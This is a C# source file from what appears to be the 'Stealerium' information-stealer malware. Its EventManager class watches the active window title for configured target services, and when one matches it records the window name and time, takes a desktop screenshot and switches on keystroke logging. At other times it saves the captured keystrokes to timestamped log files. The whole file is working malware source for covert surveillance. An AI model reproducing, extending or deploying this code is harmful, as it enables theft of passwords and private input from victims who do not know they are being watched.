using System;
using System.IO;
using System.Linq;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Modules.Keylogger
{
    /// <summary>
    /// The EventManager class manages the keylogging functionality, detecting target windows and saving logs.
    /// </summary>
    internal sealed class EventManager
    {
        // Directory where keylogger logs will be stored, generated based on the current date.
        private static readonly string KeyloggerDirectory = Path.Combine(
            Paths.InitWorkDir(),
            "logs", "keylogger", DateTime.Now.ToString("yyyy-MM-dd"));

        /// <summary>
        /// Starts the keylogger if the active window contains target values, otherwise sends the logs.
        /// </summary>
        public static void Action()
        {
            // If the active window matches a target, enable keylogger and capture screenshot
            if (Detect())
            {
                if (!string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
                {
                    Keylogger.KeyLogs += "\n\n";
                }

                Keylogger.KeyLogs += $"### {WindowManager.ActiveWindow} ### ({DateTime.Now:yyyy-MM-dd h:mm:ss tt})\n";

                // Capture a screenshot of the desktop
                DesktopScreenshot.Make(KeyloggerDirectory);

                // Enable the keylogger
                Keylogger.KeyloggerEnabled = true;
            }
            else
            {
                // If no target is detected, save the current key logs and disable the keylogger
                SendKeyLogs();
                Keylogger.KeyloggerEnabled = false;
            }
        }

        /// <summary>
        /// Detects if the active window contains any target values from the keylogger services list.
        /// </summary>
        /// <returns>True if a target value is detected in the active window title, otherwise false.</returns>
        private static bool Detect()
        {
            // Check if any of the target strings in KeyloggerServices are present in the active window title
            return Config.KeyloggerServices.Any(service =>
                WindowManager.ActiveWindow.ToLower().Contains(service.ToLower()));
        }

        /// <summary>
        /// Saves the current key logs to a log file if the logs are sufficiently long.
        /// </summary>
        private static void SendKeyLogs()
        {
            // Do not save logs if they are too short or empty
            if (Keylogger.KeyLogs.Length < 45 || string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
            {
                return;
            }

            // Define the log file path, appending a timestamp to the file name
            var logFilePath = Path.Combine(KeyloggerDirectory, $"{DateTime.Now:hh.mm.ss}.txt");

            // Ensure the keylogger directory exists; create it if it doesn't
            if (!Directory.Exists(KeyloggerDirectory))
            {
                Directory.CreateDirectory(KeyloggerDirectory);
            }

            // Write the key logs to the log file and reset the logs
            File.WriteAllText(logFilePath, Keylogger.KeyLogs);
            Keylogger.KeyLogs = ""; // Clear the key logs after saving
        }
    }
}
